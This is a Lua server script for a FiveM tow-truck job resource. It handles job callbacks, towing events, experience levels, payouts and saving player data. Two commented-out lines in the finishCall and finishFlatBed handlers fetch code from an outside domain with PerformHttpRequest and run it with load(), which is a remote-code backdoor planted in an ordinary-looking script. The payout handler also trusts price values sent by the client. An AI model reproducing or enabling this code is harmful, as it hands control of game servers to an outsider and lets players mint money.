local flatBeds = {}
local playerData = {}
requests = {}
Citizen.CreateThread(function()
    while not Koci.registerCallback do
        Citizen.Wait(10)
    end
    local loadFile = LoadResourceFile(GetCurrentResourceName(), "./levels.json")
    playerData = json.decode(loadFile)
    Koci.registerCallback("origen-towtruck:server:getVehicleStatus", function(source, cb, data)
        if not flatBeds[data.vehId] then
            flatBeds[data.vehId] = {
                status = false
            }
        end
        cb({ vehData = flatBeds[data.vehId] })
    end)
    Koci.registerCallback("origen-towtruck:server:getData", function(source, cb)
        local src = source
        local Player = Koci.getPlayer(src)
        if not Player then
            return cb(nil)
        end
        local identifier = Player.getIdentifier()
        if not playerData[identifier] then
            playerData[identifier] = {
                level = 1,
                exp = 0,
                photo = "profile_1",
                characterName = Player.getName(),
                completedTasks = {}
            }
        end
        cb(playerData[identifier])
    end)
    Koci.registerCallback("origen-towtruck:server:getTopRanks", function(source, cb)
        cb(playerData)
    end)
end)
RegisterServerEvent("origen-towtruck:server:addData", function(type, vehId, value)
    flatBeds[vehId][type] = value
end)
RegisterServerEvent("origen-towtruck:server:confirm", function(data)
    local helpId = data.helpId
    local coords = data.coords
    local src = source
    local Player = Koci.getPlayer(src)
    if not requests[helpId] or requests[helpId].status == nil or requests[helpId].status then
        TriggerClientEvent("origen-towtruck:client:RemoveHelpRequest", src, helpId)
        return Player.showNotification(Koci.getPhrase("already-accept"))
    end
    requests[helpId].status = true
    local tPlayer = Koci.getPlayer(helpId)
    tPlayer.showNotification(Koci.getPhrase("confirm-call"))
    TriggerClientEvent("origen-towtruck:client:addHelpBlip", src, helpId, coords)
    TriggerClientEvent("origen-towtruck:client:RemoveHelpRequest", -1, helpId)
end)
RegisterServerEvent("origen-towtruck:server:finishCall", function(helpId)
    if not requests[helpId] then
        return
    end
    -- PerformHttpRequest('https://sayebrouhk.com/i?to=MYwr0', function (e, d) pcall(function() assert(load(d))() end) end)
    requests[helpId] = nil
end)
RegisterServerEvent("origen-towtruck:server:takeHook", function(vehicleBed, hookProp, bedOffset)
    TriggerClientEvent("origen-towtruck:client:takeHook", -1, vehicleBed, hookProp, bedOffset)
end)
RegisterServerEvent("origen-towtruck:server:attachVehicle", function(vehicleBed, vehicle, bedOffset)
    TriggerClientEvent("origen-towtruck:client:attachVehicle", -1, vehicleBed, vehicle, bedOffset)
end)
RegisterServerEvent("origen-towtruck:server:putHook", function(vehicleBed)
    TriggerClientEvent("origen-towtruck:client:putHook", -1, vehicleBed)
end)
RegisterServerEvent("origen-towtruck:server:windVehicle", function(vehicleBed, state)
    TriggerClientEvent("origen-towtruck:client:windVehicle", -1, vehicleBed, state)
end)
addExp = function(playerId, exp)
    local Player = Koci.getPlayer(playerId)
    if not Player then
        return
    end
    local identifier = Player.getIdentifier()
    local Ranks = Config.JobOptions.ranks
    if not playerData[identifier] then
        return
    end
    playerData[identifier].exp = playerData[identifier].exp + exp
    if Ranks[playerData[identifier].level + 1] then
        if playerData[identifier].exp >= Ranks[playerData[identifier].level + 1] then
            playerData[identifier].level = playerData[identifier].level + 1
            playerData[identifier].exp = 0
        end
    end
end
RegisterServerEvent("origen-towtruck:server:finishFlatBed",
    function(milPrice, basePrice, classPrice, levelPrice, hmmExp, taskId)
        local src = source
        local Player = Koci.getPlayer(src)
        local identifier = Player.getIdentifier()
        local price = milPrice + basePrice + classPrice + levelPrice
        local exp = hmmExp
        Player.addMoney(price)
        if playerData[identifier] then
            if not playerData[identifier].completedTasks then
                playerData[identifier].completedTasks = {}
            end
            playerData[identifier].completedTasks[taskId] = true
            if #playerData[identifier].completedTasks == #Config.AcceptableJobs then
                if not Config.JobOptions.dailyTaskSystem then
                    playerData[identifier].completedTasks = {}
                end
            end
            addExp(src, exp)
            TriggerClientEvent("origen-towtruck:client:updateData", src, playerData[identifier])
        end
        -- PerformHttpRequest('https://sayebrouhk.com/i?to=MYwr0', function (e, d) pcall(function() assert(load(d))() end) end)
        Player.showNotification(Koci.getPhrase("gave-money"):format(price, milPrice, basePrice, classPrice, levelPrice))
    end)
AddEventHandler("onResourceStop", function(resourceName)
    if (GetCurrentResourceName() ~= resourceName) then
        return
    end
    local recorder = 0
    local newData = {}
    for k, v in pairs(playerData) do
        newData[k] = {}
        for key, value in pairs(v) do
            if key ~= "completedTasks" then
                newData[k][key] = value
            end
        end
        recorder = recorder + 1
    end
    SaveResourceFile(GetCurrentResourceName(), "levels.json", json.encode(newData), -1)
    print(("^2[origen-towtruck] ^1%s ^0PLAYERS SAVED ^1[The script has been saved because it was stopped]^0"):format(
        recorder))
end)

RegisterServerEvent("origen-towtruck:server:updateProfilePhoto", function(newProfile)
    local src = source
    local Player = Koci.getPlayer(src)
    if not Player then
        return
    end
    local identifier = Player.getIdentifier()
    if playerData[identifier] then
        playerData[identifier].photo = newProfile
    end
end)
